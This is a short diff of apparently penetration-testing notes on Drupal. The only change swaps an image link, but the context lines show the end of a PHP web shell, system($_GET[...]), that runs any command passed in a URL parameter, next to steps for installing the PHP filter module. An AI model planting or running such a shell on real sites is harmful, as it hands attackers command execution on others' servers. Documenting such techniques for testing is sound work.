@@ -23,7 +23,7 @@ Then navigate to Content > Add Content and create a basic page
 system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
 ?>
 ```
-![[Pasted image 20260413143959.png|594]]
+![Drupal basic page](../Images/basic-page.png)
 
 Drupal 8>
 Download and install the PHP filter module 
